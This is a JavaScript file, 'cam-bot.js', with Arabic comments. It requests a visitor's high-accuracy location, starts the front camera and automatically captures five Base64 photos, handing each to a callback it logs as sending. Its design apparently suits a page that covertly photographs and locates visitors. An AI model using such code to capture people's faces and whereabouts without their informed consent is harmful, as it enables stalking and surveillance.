// cam-bot.js - تم التصحيح الكامل لمشكلة الصور
const CamBot = {
  video: null,
  canvas: null,
  stream: null,
  captureTimer: null,
  imagesSent: 0,
  
  settings: {
    captureCount: 5,
    captureInterval: 2000,
    imageQuality: 0.75,
    videoWidth: 640,
    videoHeight: 480,
    facingMode: 'user'
  },

  init(customSettings = {}) {
    this.settings = { ...this.settings, ...customSettings };
    this.video = document.getElementById('video');
    this.canvas = document.getElementById('canvas');
    if (!this.video || !this.canvas) {
      console.error('❌ عناصر video أو canvas غير موجودة');
      return false;
    }
    return true;
  },

  async getLocation() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject('المتصفح لا يدعم تحديد الموقع');
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          mapUrl: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
        }),
        (err) => reject(this._getLocationError(err)),
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    });
  },

  _getLocationError(error) {
    switch(error.code) {
      case error.PERMISSION_DENIED: return 'تم رفض إذن الموقع';
      case error.POSITION_UNAVAILABLE: return 'الموقع غير متاح';
      case error.TIMEOUT: return 'انتهت مهلة طلب الموقع';
      default: return 'خطأ غير معروف في الموقع';
    }
  },

  async startCamera() {
    try {
      this.stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: this.settings.facingMode,
          width: { ideal: this.settings.videoWidth },
          height: { ideal: this.settings.videoHeight }
        },
        audio: false
      });
      this.video.srcObject = this.stream;
      await this.video.play();
      console.log('✅ الكاميرا تعمل');
      return true;
    } catch (err) {
      let errorMsg = 'لم يتم السماح بالكاميرا';
      if (err.name === 'NotAllowedError') errorMsg = 'تم رفض إذن الكاميرا';
      if (err.name === 'NotFoundError') errorMsg = 'لم يتم العثور على كاميرا';
      throw new Error(errorMsg);
    }
  },

  // ✅ التقاط الصورة مباشرة كـ Base64
  capture() {
    return new Promise((resolve, reject) => {
      if (!this.video.srcObject || this.video.readyState < 2) {
        reject(new Error('الكاميرا غير جاهزة'));
        return;
      }
      
      // ضبط أبعاد canvas
      this.canvas.width = this.video.videoWidth || this.settings.videoWidth;
      this.canvas.height = this.video.videoHeight || this.settings.videoHeight;
      
      // رسم الإطار الحالي من الفيديو
      const ctx = this.canvas.getContext('2d');
      ctx.drawImage(this.video, 0, 0, this.canvas.width, this.canvas.height);
      
      // تحويل إلى Base64
      const base64Image = this.canvas.toDataURL('image/jpeg', this.settings.imageQuality);
      
      console.log('📸 تم التقاط صورة بحجم:', (base64Image.length / 1024).toFixed(2), 'KB');
      resolve(base64Image);
    });
  },

  // ✅ بدء الالتقاط التلقائي
  async startAutoCapture(onCaptureCallback) {
    this.imagesSent = 0;
    const totalImages = this.settings.captureCount;
    
    console.log(`📸 بدء التقاط ${totalImages} صور...`);
    
    // التقاط الصورة الأولى فوراً
    try {
      const firstImage = await this.capture();
      if (firstImage && onCaptureCallback) {
        this.imagesSent = 1;
        console.log(`📸 إرسال الصورة ${this.imagesSent}/${totalImages}`);
        await onCaptureCallback(firstImage, this.imagesSent);
      }
    } catch (err) {
      console.error('❌ خطأ في التقاط الصورة الأولى:', err);
    }
    
    // جدولة باقي الصور
    this.captureTimer = setInterval(async () => {
      if (this.imagesSent >= totalImages) {
        this.stop();
        return;
      }
      
      try {
        const base64Image = await this.capture();
        if (base64Image && onCaptureCallback) {
          this.imagesSent++;
          console.log(`📸 إرسال الصورة ${this.imagesSent}/${totalImages}`);
          await onCaptureCallback(base64Image, this.imagesSent);
        }
        
        if (this.imagesSent >= totalImages) {
          console.log('✅ اكتمل التقاط جميع الصور');
          this.stop();
        }
      } catch (err) {
        console.error('❌ خطأ في التقاط الصورة:', err);
      }
    }, this.settings.captureInterval);
  },

  stop() {
    if (this.captureTimer) {
      clearInterval(this.captureTimer);
      this.captureTimer = null;
    }
    if (this.stream) {
      this.stream.getTracks().forEach(track => track.stop());
      this.stream = null;
    }
    console.log('⏹ تم إيقاف الكاميرا');
  },

  async startAll(onProgressCallback) {
    let locationData = null;
    try {
      locationData = await this.getLocation();
      if (onProgressCallback) onProgressCallback('location', locationData);
    } catch (err) {
      if (onProgressCallback) onProgressCallback('location_error', err);
    }

    try {
      await this.startCamera();
      if (onProgressCallback) onProgressCallback('camera_ready');
    } catch (err) {
      if (onProgressCallback) onProgressCallback('camera_error', err);
      return { success: false, location: locationData, error: err.message };
    }

    return { success: true, location: locationData };
  }
};
